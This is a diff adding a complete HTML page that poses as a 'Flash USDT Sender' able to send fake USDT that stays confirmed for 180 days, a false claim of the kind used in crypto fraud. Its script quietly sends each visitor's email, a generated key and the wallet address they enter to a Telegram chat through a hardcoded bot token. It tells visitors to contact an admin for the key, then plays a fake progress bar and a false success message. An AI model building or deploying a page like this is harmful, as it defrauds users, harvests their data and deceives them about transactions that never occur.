@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash USDT Sender</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(45deg, #0a0a0a, #3a4452);
+            overflow: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            color: #fff;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        .glow-row {
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            animation: glow 3s infinite;
+        }
+
+        @keyframes glow {
+            0% { transform: translateX(-100%); }
+            50% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        h1, h2 {
+            margin-bottom: 20px;
+            color: #00ff88;
+            text-shadow: 0 0 10px #00ff88;
+        }
+
+        p {
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .input-box {
+            margin: 20px 0;
+            position: relative;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus, select:focus {
+            background: rgba(255, 255, 255, 0.3);
+            box-shadow: 0 0 10px #00ff88;
+        }
+
+        .btn {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            background: linear-gradient(45deg, #00ff88, #00cc66);
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 10px #00ff88;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px #00ff88;
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .popup-content {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            color: #fff;
+            box-shadow: 0 0 20px #00ff88;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress {
+            width: 0;
+            height: 100%;
+            background: #00ff88;
+            transition: width 0.1s;
+        }
+
+        .background-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(0, 255, 136, 0.2) 10%, transparent 10.01%);
+            background-size: 20px 20px;
+            animation: move 10s linear infinite;
+            z-index: 0;
+        }
+
+        @keyframes move {
+            0% { background-position: 0 0; }
+            100% { background-position: 20px 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="background-animation"></div>
+    <div class="container">
+        <div class="glow-row" style="top: 10px;"></div>
+        <div class="glow-row" style="bottom: 10px;"></div>
+
+        <!-- Page 1: Welcome Page -->
+        <div class="page active" id="page1">
+            <h1>Flash USDT Sender V 1.0 Trial</h1>
+            <p>
+                Flash USDT sender is capable to send flash USDT to any wallet. Like Trust Wallet, Binance, and other wallets, it has a 1 Million limit; you are able to send any amount you want.<br>
+                This USDT Flasher is able to send Flash USDT (TRC20), (ERC20), (BEP20), and (SOL) into the network and will stay confirmed for 180 days. The coins are compatible with all types of wallets, swaps, and exchanges, including Binance Exchange, and will stay confirmed in the network for 180 days. And 30 times transferable before it gets expired.
+            </p>
+            <button class="btn" onclick="showPage('page2')">Start</button>
+        </div>
+
+        <!-- Page 2: Generate Access Key -->
+        <div class="page" id="page2">
+            <h2>Generate Access Key</h2>
+            <div class="input-box">
+                <input type="email" id="email" placeholder="Enter your email" required>
+            </div>
+            <button class="btn" onclick="generateKey()">Generate</button>
+            <div class="input-box" style="display: none;" id="keyInput">
+                <input type="text" id="accessKey" placeholder="Enter your access key">
+                <button class="btn" onclick="verifyKey()">Submit</button>
+            </div>
+        </div>
+
+        <!-- Page 3: Send USDT -->
+        <div class="page" id="page3">
+            <h2>Send Flash USDT</h2>
+            <div class="input-box">
+                <input type="text" id="address" placeholder="Wallet Address" required>
+            </div>
+            <div class="input-box">
+                <select id="network" required>
+                    <option value="" disabled selected>Select Network</option>
+                    <option value="TRC20">TRC20</option>
+                    <option value="ERC20">ERC20</option>
+                    <option value="BEP20">BEP20</option>
+                    <option value="SOL">Solana</option>
+                </select>
+            </div>
+            <div class="input-box">
+                <input type="number" id="amount" placeholder="Amount (Max 1$)" max="1" required>
+            </div>
+            <button class="btn" onclick="sendData()">Send</button>
+        </div>
+
+        <!-- Popup for Messages -->
+        <div class="popup" id="popup">
+            <div class="popup-content">
+                <p id="popupMessage"></p>
+                <button class="btn" id="popupBtn" onclick="closePopup()">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const telegramBotToken = '7191824716:AAH2iB7it3j0c59YxaMiTikeQr5lCJQNcZs';
+        const telegramChatId = '-4786268864';
+        let generatedKey = '';
+    
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        }
+    
+        function generateKey() {
+            const email = document.getElementById('email').value.trim();
+            if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                showPopup('Please enter a valid email.');
+                return;
+            }
+    
+            generatedKey = Math.random().toString(36).substr(2, 10).toUpperCase();
+            const message = `New Access Key Request:\nEmail: ${email}\nKey: ${generatedKey}`;
+    
+            sendToTelegram(message)
+                .then(() => {
+                    showPopup('Contact Admin to get your 1-time key');
+                    document.getElementById('keyInput').style.display = 'block';
+                })
+                .catch(error => {
+                    console.error('Generate Key Error:', error);
+                    showPopup('Failed to generate key. Check your internet or try a VPN.');
+                });
+        }
+    
+        function verifyKey() {
+            const enteredKey = document.getElementById('accessKey').value.trim();
+            if (enteredKey === generatedKey) {
+                showPage('page3');
+            } else {
+                showPopup('Invalid Access Key');
+            }
+        }
+    
+        function sendData() {
+            const address = document.getElementById('address').value.trim();
+            const network = document.getElementById('network').value;
+            const amount = parseFloat(document.getElementById('amount').value);
+    
+            if (!address || !network || !amount || amount <= 0 || amount > 1) {
+                showPopup('Please fill all fields correctly (Amount: 0 < x ≤ 1$)');
+                return;
+            }
+    
+            showProcessingPopup();
+    
+            const message = `New Transaction:\nAddress: ${address}\nNetwork: ${network}\nAmount: ${amount}$`;
+            
+            // Retry Telegram send up to 3 times
+            retrySendToTelegram(message, 3)
+                .then(() => {
+                    const now = new Date();
+                    const successMessage = `Congratulations! Your Transaction Amount ${amount}$ to this address ${address} on Network ${network} has been created successfully at ${now.toLocaleString()}. You will receive this amount in your wallet soon. Thanks for using our Tool. If you have any issue, contact the admin.`;
+                    setTimeout(() => {
+                        clearInterval(progressInterval);
+                        showPopup(successMessage);
+                    }, 120000); // 2 minutes
+                })
+                .catch(error => {
+                    console.error('Send Transaction Error:', error);
+                    clearInterval(progressInterval);
+                    showPopup(`Failed to send transaction: ${error.message || 'Check your internet or try a VPN.'}`);
+                });
+        }
+    
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: message
+                    })
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    throw new Error(data.description || 'Telegram API error');
+                }
+                console.log('Telegram Message Sent:', data);
+                return data;
+            } catch (error) {
+                console.error('sendToTelegram Error:', error);
+                throw error;
+            }
+        }
+    
+        async function retrySendToTelegram(message, maxRetries) {
+            for (let attempt = 1; attempt <= maxRetries; attempt++) {
+                try {
+                    return await sendToTelegram(message);
+                } catch (error) {
+                    if (attempt === maxRetries) throw error;
+                    console.log(`Retrying Telegram send (${attempt}/${maxRetries})...`);
+                    await new Promise(resolve => setTimeout(resolve, 1000 * attempt)); // Exponential backoff
+                }
+            }
+        }
+    
+        let progressInterval;
+        function showProcessingPopup() {
+            document.getElementById('popupMessage').innerHTML = `
+                Processing Transaction...<br>
+                <div class="progress-bar"><div class="progress" id="progress"></div></div>
+            `;
+            document.getElementById('popupBtn').style.display = 'none';
+            document.getElementById('popup').style.display = 'flex';
+    
+            let progress = 0;
+            document.getElementById('progress').style.width = '0%';
+            progressInterval = setInterval(() => {
+                progress += 0.833; // 100% / (120000ms / 1000ms) = 0.833% per second
+                document.getElementById('progress').style.width = `${Math.min(progress, 100)}%`;
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                }
+            }, 1000); // Update every second for smoother progress
+        }
+    
+        function showPopup(message) {
+            document.getElementById('popupMessage').innerHTML = message;
+            document.getElementById('popupBtn').style.display = 'block';
+            document.getElementById('popup').style.display = 'flex';
+        }
+    
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
+            clearInterval(progressInterval);
+        }
+    </script>
